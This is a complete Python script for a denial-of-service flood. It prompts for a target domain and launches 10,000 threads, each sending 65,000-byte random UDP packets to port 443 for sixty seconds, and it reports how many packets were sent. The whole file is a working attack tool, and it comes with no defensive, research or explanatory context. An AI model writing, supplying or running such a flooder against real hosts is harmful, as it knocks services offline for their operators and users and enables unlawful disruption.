import threading
import socket
import random
import time

def ddos(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65000)
    timeout = time.time() + duration
    sent = 0
    while True:
        if time.time() > timeout:
            break
        try:
            sock.sendto(data, (target, port))
            sent += 1
            print(f"Sent {sent} packets to {target} on port {port}")
        except Exception as e:
            print(f"Failed to send packet: {e}")

    print(f"Sent {sent} packets to {target} on port {port} in {duration} seconds")

def get_target_domain():
    return input("Enter the target domain name: ")

def main():
    target_domain = get_target_domain()
    port = 443
    duration = 60 
    num_threads = 10000
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target_domain, port, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
